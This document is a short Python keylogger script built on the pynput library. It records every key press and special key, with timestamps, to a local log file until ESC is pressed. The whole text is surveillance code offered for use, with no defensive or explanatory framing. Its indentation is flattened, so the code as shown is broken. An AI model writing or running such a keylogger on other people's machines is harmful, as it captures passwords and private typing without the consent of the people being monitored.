from pynput import keyboard
from datetime import datetime
import os

# Create logs directory if it doesn't exist
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

# File to save logs
LOG_FILE = os.path.join(LOG_DIR, "keylog.txt")

def on_press(key):
try:
with open(LOG_FILE, "a") as log:
time_stamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
log.write(f"[{time_stamp}] Key Pressed: {key.char}\n")
except AttributeError:
with open(LOG_FILE, "a") as log:
time_stamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
log.write(f"[{time_stamp}] Special Key: {key}\n")

def on_release(key):
if key == keyboard.Key.esc:
# Stop the keylogger
print("Keylogger stopped by user.")
return False

def start_keylogger():
print("Starting keylogger... Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
listener.join()

if __name__ == "__main__":
start_keylogger()
